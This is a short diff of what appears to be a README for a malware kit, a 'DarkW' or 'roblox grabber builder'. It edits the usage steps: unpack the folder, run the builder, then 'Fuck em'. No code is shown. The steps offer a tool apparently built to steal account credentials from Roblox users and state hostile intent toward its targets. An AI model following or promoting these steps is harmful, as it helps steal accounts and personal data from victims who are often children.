@@ -8,7 +8,7 @@
 
 - 1.	Drag folder("DarkW grabber builder") out of .rar
 
-- 2.	Run Setup
+- 2.	Run roblox grabber builder
 
 - 3.	Fuck em
 
